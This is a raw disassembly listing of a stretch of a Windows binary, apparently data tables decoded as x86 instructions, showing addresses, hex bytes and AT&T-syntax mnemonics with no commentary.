  405cf1:	00 01                	add    %al,(%ecx)
  405cf3:	00 10                	add    %dl,(%eax)
  405cf5:	00 d6                	add    %dl,%dh
  405cf7:	23 ba 22 05 00 3d    	and    0x3d000522(%edx),%edi
  405cfd:	00 97 00 81 01 10    	add    %dl,0x10018100(%edi)
  405d03:	00 35 1d ba 22 05    	add    %dh,0x522ba1d
  405d09:	00 44 00 9e          	add    %al,-0x62(%eax,%eax,1)
  405d0d:	00 81 01 10 00 e0    	add    %al,-0x1fffefff(%ecx)
  405d13:	0a ba 22 05 00 44    	or     0x44000522(%edx),%bh
  405d19:	00 a0 00 00 01 00    	add    %ah,0x10000(%eax)
  405d1f:	00 fc                	add    %bh,%ah
  405d21:	23 00                	and    (%eax),%eax
  405d23:	00 05 00 44 00 a2    	add    %al,0xa2004400
  405d29:	00 13                	add    %dl,(%ebx)
  405d2b:	01 00                	add    %eax,(%eax)
  405d2d:	00 f6                	add    %dh,%dh
  405d2f:	02 00                	add    (%eax),%al
  405d31:	00 61 00             	add    %ah,0x0(%ecx)
  405d34:	46                   	inc    %esi
  405d35:	00 a2 00 13 01 00    	add    %ah,0x11300(%edx)
  405d3b:	00 e4                	add    %ah,%ah
  405d3d:	04 00                	add    $0x0,%al
  405d3f:	00 61 00             	add    %ah,0x0(%ecx)
  405d42:	46                   	inc    %esi
  405d43:	00 a2 00 16 00 f1    	add    %ah,-0xeffea00(%edx)
  405d49:	06                   	push   %es
  405d4a:	12 00                	adc    (%eax),%al
  405d4c:	16                   	push   %ss
  405d4d:	00 04 04             	add    %al,(%esp,%eax,1)
  405d50:	12 00                	adc    (%eax),%al
  405d52:	16                   	push   %ss
  405d53:	00 1a                	add    %bl,(%edx)
  405d55:	07                   	pop    %es
  405d56:	12 00                	adc    (%eax),%al
  405d58:	16                   	push   %ss
  405d59:	00 f7                	add    %dh,%bh
  405d5b:	1f                   	pop    %ds
  405d5c:	12 00                	adc    (%eax),%al
  405d5e:	16                   	push   %ss
  405d5f:	00 55 18             	add    %dl,0x18(%ebp)
  405d62:	12 00                	adc    (%eax),%al
  405d64:	16                   	push   %ss
  405d65:	00 c5                	add    %al,%ch
  405d67:	09 12                	or     %edx,(%edx)
  405d69:	00 16                	add    %dl,(%esi)
  405d6b:	00 73 06             	add    %dh,0x6(%ebx)
  405d6e:	12 00                	adc    (%eax),%al
  405d70:	16                   	push   %ss
  405d71:	00 f1                	add    %dh,%cl
  405d73:	0a 12                	or     (%edx),%dl
  405d75:	00 16                	add    %dl,(%esi)
  405d77:	00 51 1d             	add    %dl,0x1d(%ecx)
  405d7a:	12 00                	adc    (%eax),%al
  405d7c:	16                   	push   %ss
  405d7d:	00 7d 12             	add    %bh,0x12(%ebp)
  405d80:	12 00                	adc    (%eax),%al
  405d82:	16                   	push   %ss
  405d83:	00 33                	add    %dh,(%ebx)
  405d85:	06                   	push   %es
  405d86:	15 00 16 00 62       	adc    $0x62001600,%eax
  405d8b:	07                   	pop    %es
  405d8c:	12 00                	adc    (%eax),%al
  405d8e:	16                   	push   %ss
  405d8f:	00 d8                	add    %bl,%al
  405d91:	08 19                	or     %bl,(%ecx)
  405d93:	00 16                	add    %dl,(%esi)
  405d95:	00 bb 23 12 00 16    	add    %bh,0x16001223(%ebx)
  405d9b:	00 f5                	add    %dh,%ch
  405d9d:	22 12                	and    (%edx),%dl
  405d9f:	00 16                	add    %dl,(%esi)
  405da1:	00 b8 05 12 00 16    	add    %bh,0x16001205(%eax)
  405da7:	00 2a                	add    %ch,(%edx)
  405da9:	07                   	pop    %es
  405daa:	12 00                	adc    (%eax),%al
  405dac:	11 00                	adc    %eax,(%eax)
  405dae:	70 0c                	jo     0x405dbc
  405db0:	21 00                	and    %eax,(%eax)
  405db2:	11 00                	adc    %eax,(%eax)
  405db4:	55                   	push   %ebp
  405db5:	0c 25                	or     $0x25,%al
  405db7:	00 11                	add    %dl,(%ecx)
  405db9:	00 25 0c 29 00 11    	add    %ah,0x1100290c
  405dbf:	00 d9                	add    %bl,%cl
  405dc1:	0b 2d 00 11 00 3d    	or     0x3d001100,%ebp
  405dc7:	0c 2d                	or     $0x2d,%al
  405dc9:	00 11                	add    %dl,(%ecx)
  405dcb:	00 be 0b 30 00 11    	add    %bh,0x1100300b(%esi)
  405dd1:	00 a1 0b 34 00 31    	add    %ah,0x3100340b(%ecx)
  405dd7:	00 87 0b 37 00 11    	add    %al,0x1100370b(%edi)
  405ddd:	00 f5                	add    %dh,%ch
  405ddf:	0b 30                	or     (%eax),%esi
  405de1:	00 11                	add    %dl,(%ecx)
  405de3:	00 0b                	add    %cl,(%ebx)
  405de5:	0c 3a                	or     $0x3a,%al
  405de7:	00 11                	add    %dl,(%ecx)
  405de9:	00 57 03             	add    %dl,0x3(%edi)
  405dec:	c3                   	ret
  405ded:	00 01                	add    %al,(%ecx)
  405def:	00 65 04             	add    %ah,0x4(%ebp)
  405df2:	f2 00 01             	repnz add %al,(%ecx)
  405df5:	00 29                	add    %ch,(%ecx)
  405df7:	05 3a 00 01 00       	add    $0x1003a,%eax
  405dfc:	65 04 f2             	gs add $0xf2,%al
  405dff:	00 01                	add    %al,(%ecx)
  405e01:	00 41 06             	add    %al,0x6(%ecx)
  405e04:	10 01                	adc    %al,(%ecx)
  405e06:	01 00                	add    %eax,(%eax)
  405e08:	dc 01                	faddl  (%ecx)
  405e0a:	12 00                	adc    (%eax),%al
  405e0c:	01 00                	add    %eax,(%eax)
  405e0e:	b4 09                	mov    $0x9,%ah
  405e10:	12 00                	adc    (%eax),%al
  405e12:	01 00                	add    %eax,(%eax)
  405e14:	c2 02 37             	ret    $0x3702
  405e17:	00 01                	add    %al,(%ecx)
  405e19:	00 02                	add    %al,(%edx)
  405e1b:	12 4b 01             	adc    0x1(%ebx),%cl
  405e1e:	01 00                	add    %eax,(%eax)
  405e20:	c5 00                	lds    (%eax),%eax
  405e22:	10 01                	adc    %al,(%ecx)
  405e24:	01 00                	add    %eax,(%eax)
  405e26:	65 04 f2             	gs add $0xf2,%al
  405e29:	00 01                	add    %al,(%ecx)
  405e2b:	00 33                	add    %dh,(%ebx)
  405e2d:	15 4f 01 06 06       	adc    $0x606014f,%eax
  405e32:	fc                   	cld
  405e33:	09 3a                	or     %edi,(%edx)
  405e35:	00 56 80             	add    %dl,-0x80(%esi)
  405e38:	14 02                	adc    $0x2,%al
  405e3a:	4b                   	dec    %ebx
  405e3b:	01 56 80             	add    %edx,-0x80(%esi)
  405e3e:	d1 12                	rcll   $1,(%edx)
  405e40:	4b                   	dec    %ebx
  405e41:	01 56 80             	add    %edx,-0x80(%esi)
  405e44:	c6                   	(bad)
  405e45:	1a 4b 01             	sbb    0x1(%ebx),%cl
  405e48:	56                   	push   %esi
  405e49:	80 46 04 4b          	addb   $0x4b,0x4(%esi)
  405e4d:	01 56 80             	add    %edx,-0x80(%esi)
  405e50:	98                   	cwtl
  405e51:	09 4b 01             	or     %ecx,0x1(%ebx)
  405e54:	56                   	push   %esi
  405e55:	80 45 01 4b          	addb   $0x4b,0x1(%ebp)
  405e59:	01 56 80             	add    %edx,-0x80(%esi)
  405e5c:	af                   	scas   %es:(%edi),%eax
  405e5d:	22 4b 01             	and    0x1(%ebx),%cl
  405e60:	56                   	push   %esi
  405e61:	80 9a 07 4b 01 56 80 	sbbb   $0x80,0x56014b07(%edx)
  405e68:	33 17                	xor    (%edi),%edx
  405e6a:	4b                   	dec    %ebx
  405e6b:	01 56 80             	add    %edx,-0x80(%esi)
  405e6e:	52                   	push   %edx
  405e6f:	14 4b                	adc    $0x4b,%al
  405e71:	01 56 80             	add    %edx,-0x80(%esi)
  405e74:	c4 0a                	les    (%edx),%ecx
  405e76:	4b                   	dec    %ebx
  405e77:	01 56 80             	add    %edx,-0x80(%esi)
  405e7a:	1a 09                	sbb    (%ecx),%cl
  405e7c:	4b                   	dec    %ebx
  405e7d:	01 06                	add    %eax,(%esi)
  405e7f:	06                   	push   %es
  405e80:	fc                   	cld
  405e81:	09 87 02 56 80 13    	or     %eax,0x13805602(%edi)
  405e87:	03 8a 02 56 80 09    	add    0x9805602(%edx),%ecx
  405e8d:	24 8a                	and    $0x8a,%al
  405e8f:	02 56 80             	add    -0x80(%esi),%dl
  405e92:	61                   	popa
  405e93:	09 8a 02 16 00 a8    	or     %ecx,-0x57ffe9fe(%edx)
  405e99:	07                   	pop    %es
  405e9a:	93                   	xchg   %eax,%ebx
  405e9b:	02 31                	add    (%ecx),%dh
  405e9d:	00 18                	add    %bl,(%eax)
  405e9f:	26 12 00             	adc    %es:(%eax),%al
  405ea2:	16                   	push   %ss
  405ea3:	00 8b 02 f2 00 16    	add    %cl,0x1600f202(%ebx)
  405ea9:	00 f9                	add    %bh,%cl
  405eab:	14 b6                	adc    $0xb6,%al
  405ead:	02 51 80             	add    -0x80(%ecx),%dl
  405eb0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405eb1:	09 3a                	or     %edi,(%edx)
  405eb3:	00 51 80             	add    %dl,-0x80(%ecx)
  405eb6:	d5 0a                	aad    $0xa
  405eb8:	3a 00                	cmp    (%eax),%al
  405eba:	51                   	push   %ecx
  405ebb:	80 de 00             	sbb    $0x0,%dh
  405ebe:	3a 00                	cmp    (%eax),%al
  405ec0:	51                   	push   %ecx
  405ec1:	80 da 03             	sbb    $0x3,%dl
  405ec4:	3a 00                	cmp    (%eax),%al
  405ec6:	21 00                	and    %eax,(%eax)
  405ec8:	0a 17                	or     (%edi),%dl
  405eca:	29 00                	sub    %eax,(%eax)
  405ecc:	21 00                	and    %eax,(%eax)
  405ece:	75 05                	jne    0x405ed5
  405ed0:	29 00                	sub    %eax,(%eax)
  405ed2:	31 00                	xor    %eax,(%eax)
  405ed4:	4e                   	dec    %esi
  405ed5:	15 29 00 33 01       	adc    $0x1330029,%eax
  405eda:	25 06 f2 02 33       	and    $0x3302f206,%eax
  405edf:	01 f0                	add    %esi,%eax
  405ee1:	23 f6                	and    %esi,%esi
  405ee3:	02 20                	add    (%eax),%ah
  405ee5:	26 00 00             	add    %al,%es:(%eax)
  405ee8:	00 00                	add    %al,(%eax)
  405eea:	96                   	xchg   %eax,%esi
  405eeb:	00 7a 18             	add    %bh,0x18(%edx)
  405eee:	0a 00                	or     (%eax),%al
  405ef0:	01 00                	add    %eax,(%eax)
  405ef2:	78 20                	js     0x405f14
  405ef4:	00 00                	add    %al,(%eax)
  405ef6:	00 00                	add    %al,(%eax)
  405ef8:	86 18                	xchg   %bl,(%eax)
  405efa:	e9 1c 0e 00 01       	jmp    0x1406d1b
  405eff:	00 f4                	add    %dh,%ah
  405f01:	26 00 00             	add    %al,%es:(%eax)
  405f04:	00 00                	add    %al,(%eax)
  405f06:	96                   	xchg   %eax,%esi
  405f07:	00 fb                	add    %bh,%bl
  405f09:	07                   	pop    %es
  405f0a:	1d 00 01 00 30       	sbb    $0x30000100,%eax
  405f0f:	28 00                	sub    %al,(%eax)
  405f11:	00 00                	add    %al,(%eax)
  405f13:	00 91 00 55 02 1d    	add    %dl,0x1d025500(%ecx)
  405f19:	00 01                	add    %al,(%ecx)
  405f1b:	00 98 28 00 00 00    	add    %bl,0x28(%eax)
  405f21:	00 91 18 ef 1c 0a    	add    %dl,0xa1cef18(%ecx)
  405f27:	00 01                	add    %al,(%ecx)
  405f29:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  405f2f:	00 96 08 5a 21 3d    	add    %dl,0x3d215a08(%esi)
  405f35:	00 01                	add    %al,(%ecx)
  405f37:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  405f3d:	00 96 08 68 21 42    	add    %dl,0x42216808(%esi)
  405f43:	00 01                	add    %al,(%ecx)
  405f45:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  405f4b:	00 96 08 3e 21 48    	add    %dl,0x48213e08(%esi)
  405f51:	00 02                	add    %al,(%edx)
  405f53:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  405f59:	00 96 08 4c 21 4d    	add    %dl,0x4d214c08(%esi)
  405f5f:	00 02                	add    %al,(%edx)
  405f61:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  405f67:	00 91 08 d9 1b 53    	add    %dl,0x531bd908(%ecx)
  405f6d:	00 03                	add    %al,(%ebx)
  405f6f:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  405f75:	00 91 08 e4 1b 58    	add    %dl,0x581be408(%ecx)
  405f7b:	00 03                	add    %al,(%ebx)
  405f7d:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  405f83:	00 91 08 2a 12 5e    	add    %dl,0x5e122a08(%ecx)
  405f89:	00 04 00             	add    %al,(%eax,%eax,1)
  405f8c:	b4 20                	mov    $0x20,%ah
  405f8e:	00 00                	add    %al,(%eax)
  405f90:	00 00                	add    %al,(%eax)
  405f92:	91                   	xchg   %eax,%ecx
  405f93:	08 39                	or     %bh,(%ecx)
  405f95:	12 62 00             	adc    0x0(%edx),%ah
  405f98:	04 00                	add    $0x0,%al
  405f9a:	bc 20 00 00 00       	mov    $0x20,%esp
  405f9f:	00 91 08 d4 20 5e    	add    %dl,0x5e20d408(%ecx)
  405fa5:	00 05 00 c3 20 00    	add    %al,0x20c300
  405fab:	00 00                	add    %al,(%eax)
  405fad:	00 91 08 df 20 62    	add    %dl,0x6220df08(%ecx)
  405fb3:	00 05 00 cb 20 00    	add    %al,0x20cb00
  405fb9:	00 00                	add    %al,(%eax)
  405fbb:	00 91 08 df 11 67    	add    %dl,0x6711df08(%ecx)
  405fc1:	00 06                	add    %al,(%esi)
  405fc3:	00 d2                	add    %dl,%dl
  405fc5:	20 00                	and    %al,(%eax)
  405fc7:	00 00                	add    %al,(%eax)
  405fc9:	00 91 08 ed 11 6c    	add    %dl,0x6c11ed08(%ecx)
  405fcf:	00 06                	add    %al,(%esi)
  405fd1:	00 da                	add    %bl,%dl
  405fd3:	20 00                	and    %al,(%eax)
  405fd5:	00 00                	add    %al,(%eax)
  405fd7:	00 96 08 5e 0b 1d    	add    %dl,0x1d0b5e08(%esi)
  405fdd:	00 07                	add    %al,(%edi)
  405fdf:	00 e1                	add    %ah,%cl
  405fe1:	20 00                	and    %al,(%eax)
  405fe3:	00 00                	add    %al,(%eax)
  405fe5:	00 96 08 6e 0b 72    	add    %dl,0x720b6e08(%esi)
  405feb:	00 07                	add    %al,(%edi)
  405fed:	00 e9                	add    %ch,%cl
  405fef:	20 00                	and    %al,(%eax)
  405ff1:	00 00                	add    %al,(%eax)
  405ff3:	00 91 08 a2 0a 77    	add    %dl,0x770aa208(%ecx)
  405ff9:	00 08                	add    %cl,(%eax)
  405ffb:	00 f0                	add    %dh,%al
  405ffd:	20 00                	and    %al,(%eax)
  405fff:	00 00                	add    %al,(%eax)
  406001:	00 91 08 32 13 67    	add    %dl,0x67133208(%ecx)
  406007:	00 08                	add    %cl,(%eax)
  406009:	00 f7                	add    %dh,%bh
  40600b:	20 00                	and    %al,(%eax)
  40600d:	00 00                	add    %al,(%eax)
  40600f:	00 91 08 3b 13 6c    	add    %dl,0x6c133b08(%ecx)
  406015:	00 08                	add    %cl,(%eax)
  406017:	00 ff                	add    %bh,%bh
  406019:	20 00                	and    %al,(%eax)
  40601b:	00 00                	add    %al,(%eax)
  40601d:	00 96 08 a8 16 7b    	add    %dl,0x7b16a808(%esi)
  406023:	00 09                	add    %cl,(%ecx)
  406025:	00 06                	add    %al,(%esi)
  406027:	21 00                	and    %eax,(%eax)
  406029:	00 00                	add    %al,(%eax)
  40602b:	00 96 08 b5 16 7f    	add    %dl,0x7f16b508(%esi)
  406031:	00 09                	add    %cl,(%ecx)
  406033:	00 3c 29             	add    %bh,(%ecx,%ebp,1)
  406036:	00 00                	add    %al,(%eax)
  406038:	00 00                	add    %al,(%eax)
  40603a:	96                   	xchg   %eax,%esi
  40603b:	00 b1 12 0a 00 0a    	add    %dh,0xa000a12(%ecx)
  406041:	00 0e                	add    %cl,(%esi)
  406043:	21 00                	and    %eax,(%eax)
  406045:	00 00                	add    %al,(%eax)
  406047:	00 91 00 06 08 84    	add    %dl,-0x7bf7fa00(%ecx)
  40604d:	00 0a                	add    %cl,(%edx)
  40604f:	00 19                	add    %bl,(%ecx)
  406051:	21 00                	and    %eax,(%eax)
  406053:	00 00                	add    %al,(%eax)
  406055:	00 91 00 11 0a 89    	add    %dl,-0x76f5ef00(%ecx)
  40605b:	00 0b                	add    %cl,(%ebx)
  40605d:	00 34 2c             	add    %dh,(%esp,%ebp,1)
  406060:	00 00                	add    %al,(%eax)
  406062:	00 00                	add    %al,(%eax)
  406064:	96                   	xchg   %eax,%esi
  406065:	00 48 02             	add    %cl,0x2(%eax)
  406068:	0a 00                	or     (%eax),%al
  40606a:	0f 00 98 2c 00 00 00 	ltr    0x2c(%eax)
  406071:	00 96 00 34 09 94    	add    %dl,-0x6bf6cc00(%esi)
  406077:	00 0f                	add    %cl,(%edi)
  406079:	00 58 2e             	add    %bl,0x2e(%eax)
  40607c:	00 00                	add    %al,(%eax)
  40607e:	00 00                	add    %al,(%eax)
  406080:	96                   	xchg   %eax,%esi
  406081:	00 68 05             	add    %ch,0x5(%eax)
  406084:	58                   	pop    %eax
  406085:	00 10                	add    %dl,(%eax)
  406087:	00 74 2f 00          	add    %dh,0x0(%edi,%ebp,1)
  40608b:	00 00                	add    %al,(%eax)
  40608d:	00 96 00 12 21 9a    	add    %dl,-0x65deee00(%esi)
  406093:	00 11                	add    %dl,(%ecx)
  406095:	00 26                	add    %ah,(%esi)
  406097:	21 00                	and    %eax,(%eax)
  406099:	00 00                	add    %al,(%eax)
  40609b:	00 91 00 58 26 9a    	add    %dl,-0x65d9a800(%ecx)
  4060a1:	00 12                	add    %dl,(%edx)
  4060a3:	00 34 21             	add    %dh,(%ecx,%eiz,1)
  4060a6:	00 00                	add    %al,(%eax)
  4060a8:	00 00                	add    %al,(%eax)
  4060aa:	91                   	xchg   %eax,%ecx
  4060ab:	18 ef                	sbb    %ch,%bh
  4060ad:	1c 0a                	sbb    $0xa,%al
  4060af:	00 13                	add    %dl,(%ebx)
  4060b1:	00 40 21             	add    %al,0x21(%eax)
  4060b4:	00 00                	add    %al,(%eax)
  4060b6:	00 00                	add    %al,(%eax)
  4060b8:	96                   	xchg   %eax,%esi
  4060b9:	00 89 01 c7 00 13    	add    %cl,0x1300c701(%ecx)
  4060bf:	00 4d 21             	add    %cl,0x21(%ebp)
  4060c2:	00 00                	add    %al,(%eax)
  4060c4:	00 00                	add    %al,(%eax)
  4060c6:	96                   	xchg   %eax,%esi
  4060c7:	00 c2                	add    %al,%dl
  4060c9:	16                   	push   %ss
  4060ca:	cd 00                	int    $0x0
  4060cc:	14 00                	adc    $0x0,%al
  4060ce:	08 30                	or     %dh,(%eax)
  4060d0:	00 00                	add    %al,(%eax)
  4060d2:	00 00                	add    %al,(%eax)
  4060d4:	96                   	xchg   %eax,%esi
  4060d5:	00 6d 01             	add    %ch,0x1(%ebp)
  4060d8:	cd 00                	int    $0x0
  4060da:	15 00 4c 30 00       	adc    $0x304c00,%eax
  4060df:	00 00                	add    %al,(%eax)
  4060e1:	00 96 00 42 15 cd    	add    %dl,-0x32eabe00(%esi)
  4060e7:	00 16                	add    %dl,(%esi)
  4060e9:	00 90 30 00 00 00    	add    %dl,0x30(%eax)
  4060ef:	00 96 00 d8 04 d3    	add    %dl,-0x2cfb2800(%esi)
  4060f5:	00 17                	add    %dl,(%edi)
  4060f7:	00 5a 21             	add    %bl,0x21(%edx)
  4060fa:	00 00                	add    %al,(%eax)
  4060fc:	00 00                	add    %al,(%eax)
  4060fe:	96                   	xchg   %eax,%esi
  4060ff:	00 5b 1f             	add    %bl,0x1f(%ebx)
  406102:	da 00                	fiaddl (%eax)
  406104:	18 00                	sbb    %al,(%eax)
  406106:	67 21 00             	and    %eax,(%bx,%si)
  406109:	00 00                	add    %al,(%eax)
  40610b:	00 96 00 eb 0c e0    	add    %dl,-0x1ff31500(%esi)
  406111:	00 19                	add    %bl,(%ecx)
  406113:	00 8b 21 00 00 00    	add    %cl,0x21(%ebx)
  406119:	00 96 00 42 09 e6    	add    %dl,-0x19f6be00(%esi)
  40611f:	00 1a                	add    %bl,(%edx)
  406121:	00 9f 21 00 00 00    	add    %bl,0x21(%edi)
  406127:	00 96 00 0e 16 ec    	add    %dl,-0x13e9f200(%esi)
  40612d:	00 1b                	add    %bl,(%ebx)
  40612f:	00 78 20             	add    %bh,0x20(%eax)
  406132:	00 00                	add    %al,(%eax)
  406134:	00 00                	add    %al,(%eax)
  406136:	86 18                	xchg   %bl,(%eax)
  406138:	e9 1c 0e 00 1c       	jmp    0x1c406f59
  40613d:	00 ac 21 00 00 00 00 	add    %ch,0x0(%ecx,%eiz,1)
  406144:	91                   	xchg   %eax,%ecx
  406145:	18 ef                	sbb    %ch,%bh
  406147:	1c 0a                	sbb    $0xa,%al
  406149:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40614c:	b8 21 00 00 00       	mov    $0x21,%eax
  406151:	00 86 18 e9 1c fa    	add    %al,-0x5e316e8(%esi)
  406157:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40615a:	ce                   	into
  40615b:	21 00                	and    %eax,(%eax)
  40615d:	00 00                	add    %al,(%eax)
  40615f:	00 e1                	add    %ah,%cl
  406161:	09 a9 21 04 01 1d    	or     %ebp,0x1d010421(%ecx)
  406167:	00 e1                	add    %ah,%cl
  406169:	21 00                	and    %eax,(%eax)
  40616b:	00 00                	add    %al,(%eax)
  40616d:	00 e1                	add    %ah,%cl
  40616f:	01 7b 22             	add    %edi,0x22(%ebx)
  406172:	08 01                	or     %al,(%ecx)
  406174:	1d 00 04 22 00       	sbb    $0x220400,%eax
  406179:	00 00                	add    %al,(%eax)
  40617b:	00 e1                	add    %ah,%cl
  40617d:	01 af 20 0e 00 1d    	add    %ebp,0x1d000e20(%edi)
  406183:	00 0d 22 00 00 00    	add    %cl,0x22
  406189:	00 86 18 e9 1c 14    	add    %al,0x141ce918(%esi)
  40618f:	01 1d 00 23 22 00    	add    %ebx,0x222300
  406195:	00 00                	add    %al,(%eax)
  406197:	00 86 00 bf 08 20    	add    %al,0x2008bf00(%esi)
  40619d:	01 1f                	add    %ebx,(%edi)
  40619f:	00 30                	add    %dh,(%eax)
  4061a1:	22 00                	and    (%eax),%al
  4061a3:	00 00                	add    %al,(%eax)
  4061a5:	00 86 00 1f 1b 25    	add    %al,0x251b1f00(%esi)
  4061ab:	01 1f                	add    %ebx,(%edi)
  4061ad:	00 44 22 00          	add    %al,0x0(%edx,%eiz,1)
  4061b1:	00 00                	add    %al,(%eax)
  4061b3:	00 86 00 72 03 2b    	add    %al,0x2b037200(%esi)
  4061b9:	01 20                	add    %esp,(%eax)
  4061bb:	00 58 22             	add    %bl,0x22(%eax)
  4061be:	00 00                	add    %al,(%eax)
  4061c0:	00 00                	add    %al,(%eax)
  4061c2:	86 00                	xchg   %al,(%eax)
  4061c4:	e4 24                	in     $0x24,%al
  4061c6:	31 01                	xor    %eax,(%ecx)
  4061c8:	21 00                	and    %eax,(%eax)
  4061ca:	6c                   	insb   (%dx),%es:(%edi)
  4061cb:	22 00                	and    (%eax),%al
  4061cd:	00 00                	add    %al,(%eax)
  4061cf:	00 86 08 a6 17 37    	add    %al,0x3717a608(%esi)
  4061d5:	01 22                	add    %esp,(%edx)
  4061d7:	00 7a 22             	add    %bh,0x22(%edx)
  4061da:	00 00                	add    %al,(%eax)
  4061dc:	00 00                	add    %al,(%eax)
  4061de:	86 08                	xchg   %cl,(%eax)
  4061e0:	b7 14                	mov    $0x14,%bh
  4061e2:	3d 01 23 00 87       	cmp    $0x87002301,%eax
  4061e7:	22 00                	and    (%eax),%al
  4061e9:	00 00                	add    %al,(%eax)
  4061eb:	00 81 00 b3 0c 53    	add    %al,0x530cb300(%ecx)
  4061f1:	01 23                	add    %esp,(%ebx)
  4061f3:	00 c8                	add    %cl,%al
  4061f5:	30 00                	xor    %al,(%eax)
  4061f7:	00 00                	add    %al,(%eax)
  4061f9:	00 81 00 a9 00 0e    	add    %al,0xe00a900(%ecx)
  4061ff:	00 24 00             	add    %ah,(%eax,%eax,1)
  406202:	08 31                	or     %dh,(%ecx)
  406204:	00 00                	add    %al,(%eax)
  406206:	00 00                	add    %al,(%eax)
  406208:	81 00 95 1a 20 01    	addl   $0x1201a95,(%eax)
  40620e:	24 00                	and    $0x0,%al
  406210:	30 31                	xor    %dh,(%ecx)
  406212:	00 00                	add    %al,(%eax)
  406214:	00 00                	add    %al,(%eax)
  406216:	81 00 26 09 58 01    	addl   $0x1580926,(%eax)
  40621c:	24 00                	and    $0x0,%al
  40621e:	a0 31 00 00 00       	mov    0x31,%al
  406223:	00 86 00 44 05 25    	add    %al,0x25054400(%esi)
  406229:	01 25 00 a1 22 00    	add    %esp,0x22a100
  40622f:	00 00                	add    %al,(%eax)
  406231:	00 81 00 7a 24 20    	add    %al,0x20247a00(%ecx)
  406237:	01 26                	add    %esp,(%esi)
  406239:	00 bf 22 00 00 00    	add    %bh,0x22(%edi)
  40623f:	00 81 00 51 01 20    	add    %al,0x20015100(%ecx)
  406245:	01 26                	add    %esp,(%esi)
  406247:	00 dd                	add    %bl,%ch
  406249:	22 00                	and    (%eax),%al
  40624b:	00 00                	add    %al,(%eax)
  40624d:	00 86 00 59 06 20    	add    %al,0x20065900(%esi)
  406253:	01 26                	add    %esp,(%esi)
  406255:	00 c8                	add    %cl,%al
  406257:	31 00                	xor    %eax,(%eax)
  406259:	00 00                	add    %al,(%eax)
  40625b:	00 81 00 72 04 5d    	add    %al,0x5d047200(%ecx)
  406261:	01 26                	add    %esp,(%esi)
  406263:	00 84 32 00 00 00 00 	add    %al,0x0(%edx,%esi,1)
  40626a:	81 00 d1 00 5d 01    	addl   $0x15d00d1,(%eax)
  406270:	27                   	daa
  406271:	00 e5                	add    %ah,%ch
  406273:	22 00                	and    (%eax),%al
  406275:	00 00                	add    %al,(%eax)
  406277:	00 86 00 62 02 63    	add    %al,0x63026200(%esi)
  40627d:	01 28                	add    %ebp,(%eax)
  40627f:	00 fa                	add    %bh,%dl
  406281:	22 00                	and    (%eax),%al
  406283:	00 00                	add    %al,(%eax)
  406285:	00 86 00 49 03 68    	add    %al,0x68034900(%esi)
  40628b:	01 29                	add    %ebp,(%ecx)
  40628d:	00 28                	add    %ch,(%eax)
  40628f:	33 00                	xor    (%eax),%eax
  406291:	00 00                	add    %al,(%eax)
  406293:	00 86 00 19 15 6d    	add    %al,0x6d151900(%esi)
  406299:	01 2a                	add    %ebp,(%edx)
  40629b:	00 cc                	add    %cl,%ah
  40629d:	33 00                	xor    (%eax),%eax
  40629f:	00 00                	add    %al,(%eax)
  4062a1:	00 86 00 97 24 71    	add    %al,0x71249700(%esi)
  4062a7:	01 2a                	add    %ebp,(%edx)
  4062a9:	00 70 34             	add    %dh,0x34(%eax)
  4062ac:	00 00                	add    %al,(%eax)
  4062ae:	00 00                	add    %al,(%eax)
  4062b0:	86 00                	xchg   %al,(%eax)
  4062b2:	c4 19                	les    (%ecx),%ebx
  4062b4:	75 01                	jne    0x4062b7
  4062b6:	2a 00                	sub    (%eax),%al
  4062b8:	0f 23 00             	mov    %eax,%db0
  4062bb:	00 00                	add    %al,(%eax)
  4062bd:	00 86 00 a8 1a 79    	add    %al,0x791aa800(%esi)
  4062c3:	01 2a                	add    %ebp,(%edx)
  4062c5:	00 00                	add    %al,(%eax)
  4062c7:	35 00 00 00 00       	xor    $0x0,%eax
  4062cc:	86 00                	xchg   %al,(%eax)
  4062ce:	24 23                	and    $0x23,%al
  4062d0:	7f 01                	jg     0x4062d3
  4062d2:	2b 00                	sub    (%eax),%eax
  4062d4:	20 23                	and    %ah,(%ebx)
  4062d6:	00 00                	add    %al,(%eax)
  4062d8:	00 00                	add    %al,(%eax)
  4062da:	86 00                	xchg   %al,(%eax)
  4062dc:	d4 1e                	aam    $0x1e
  4062de:	84 01                	test   %al,(%ecx)
  4062e0:	2b 00                	sub    (%eax),%eax
  4062e2:	35 23 00 00 00       	xor    $0x23,%eax
  4062e7:	00 86 00 d5 24 8a    	add    %al,-0x75db2b00(%esi)
  4062ed:	01 2d 00 b0 35 00    	add    %ebp,0x35b000
  4062f3:	00 00                	add    %al,(%eax)
  4062f5:	00 86 00 2e 03 90    	add    %al,-0x6ffcd200(%esi)
  4062fb:	01 2f                	add    %ebp,(%edi)
  4062fd:	00 4b 23             	add    %cl,0x23(%ebx)
  406300:	00 00                	add    %al,(%eax)
  406302:	00 00                	add    %al,(%eax)
  406304:	86 00                	xchg   %al,(%eax)
  406306:	e8 14 90 01 30       	call   0x3041f31f
  40630b:	00 04 36             	add    %al,(%esi,%esi,1)
  40630e:	00 00                	add    %al,(%eax)
  406310:	00 00                	add    %al,(%eax)
  406312:	86 00                	xchg   %al,(%eax)
  406314:	30 02                	xor    %al,(%edx)
  406316:	25 01 31 00 89       	and    $0x89003101,%eax
  40631b:	23 00                	and    (%eax),%eax
  40631d:	00 00                	add    %al,(%eax)
  40631f:	00 86 00 8b 0c 0e    	add    %al,0xe0c8b00(%esi)
  406325:	00 32                	add    %dh,(%edx)
  406327:	00 9f 23 00 00 00    	add    %bl,0x23(%edi)
  40632d:	00 86 00 17 01 53    	add    %al,0x53011700(%esi)
  406333:	01 32                	add    %esi,(%edx)
  406335:	00 af 23 00 00 00    	add    %ch,0x23(%edi)
  40633b:	00 86 00 cd 0c 95    	add    %al,-0x6af33300(%esi)
  406341:	01 33                	add    %esi,(%ebx)
  406343:	00 ca                	add    %cl,%dl
  406345:	23 00                	and    (%eax),%eax
  406347:	00 00                	add    %al,(%eax)
  406349:	00 86 00 a5 02 99    	add    %al,-0x66fd5b00(%esi)
